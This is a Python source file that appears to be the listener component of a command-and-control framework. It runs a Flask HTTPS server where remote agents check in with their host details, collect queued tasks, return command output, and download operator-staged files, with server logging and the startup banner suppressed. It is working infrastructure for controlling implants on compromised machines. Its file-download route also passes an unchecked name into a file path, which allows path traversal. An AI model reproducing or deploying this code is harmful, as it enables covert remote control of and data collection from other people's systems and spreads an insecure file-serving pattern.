from agent import Agent
from agentshelpers import clearAgentTasks, displayResults
from common import *

import threading
import logging
import flask
import sys
import os
import pickle

from collections import OrderedDict
from multiprocessing import Process
from random import choice
from string import ascii_uppercase

class Listener:    

    def __init__(self, name, port, ipaddress, uri_reg, uri_tasks, uri_results, uri_download):
    
        
        self.name       = name
        self.port       = port
        self.ipaddress  = ipaddress
        self.Path       = "data/listeners/{}/".format(self.name)
        self.filePath   = "{}files/".format(self.Path)
        self.agentsPath = "{}agents/".format(self.Path)
        self.isRunning  = False
        self.uri_reg	= uri_reg
        self.uri_tasks	= uri_tasks
        self.uri_results = uri_results
        self.uri_download = uri_download
        self.app        = flask.Flask(__name__)

        if os.path.exists(self.Path) == False:
            os.mkdir(self.Path)

        if os.path.exists(self.agentsPath) == False:
            os.mkdir(self.agentsPath)

        if os.path.exists(self.filePath) == False:
            os.mkdir(self.filePath)

	#register routes
        @self.app.route(uri_reg, methods=['POST'])
        def registerAgent():
            name     = ''.join(choice(ascii_uppercase) for i in range(6))
            remoteip = flask.request.remote_addr
            hostname = flask.request.form.get("name")
            Type     = flask.request.form.get("type")
            writeToDatabase(agentsDB, Agent(name, self.name, remoteip, hostname, Type))
            success("Agent {} checked in.".format(name))
            return (name, 200)
        
        @self.app.route(uri_tasks + "/<name>", methods=['GET'])
        def serveTasks(name):
            if os.path.exists("{}/{}/tasks".format(self.agentsPath, name)):
                
                with open("{}{}/tasks".format(self.agentsPath, name), "r") as f:
                    task = f.read()
                
                clearAgentTasks(name)
                return(task,200)
            else:
                return ('',204)

        @self.app.route(uri_results +"/<name>", methods=['POST'])
        def receiveResults(name):
            result = flask.request.form.get("result")
            displayResults(name, result)
            return ('',204)

        @self.app.route(uri_download + "/<name>", methods=['GET'])
        def sendFile(name):
            f    = open("{}{}".format(self.filePath, name), "rt")
            data = f.read()
            
            f.close()
            return (data, 200)


    def run(self):
        self.app.logger.disabled = True
        # run on https
        self.app.run(port=self.port, host=self.ipaddress, ssl_context=('/path/to/your/cert.crt', '/path/to/your/cert.key'))

    def setFlag(self):
        self.flag = 1

    def start(self):

        self.server = Process(target=self.run)

        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        self.daemon = threading.Thread(name = self.name,
                                       target = self.server.start,
                                       args = ())
        self.daemon.daemon = True
        self.daemon.start()

        self.isRunning = True

    def stop(self):

        self.server.terminate()
        self.server    = None
        self.daemon    = None
        self.isRunning = False
